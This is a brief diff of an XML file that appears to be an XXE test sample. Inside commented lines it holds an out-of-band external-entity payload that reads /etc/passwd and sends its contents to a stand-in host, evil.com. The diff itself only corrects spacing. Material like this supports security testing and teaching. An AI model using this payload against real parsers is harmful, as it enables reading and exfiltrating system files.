@@ -3,5 +3,5 @@
 <foo>&external;</foo>
 
 <!--        Содержимое файла xxe_file:-->
-<!--<!ENTITY% payload SYSTEM "file:///etc/passwd">-->
-<!--<!ENTITY% param1 "<!ENTITY external SYSTEM 'http://evil.com/log_xxe?data=%payload;'>">-->
+<!--<!ENTITY % payload SYSTEM "file:///etc/passwd">-->
+<!--<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://evil.com/log_xxe?data=%payload;'>">-->
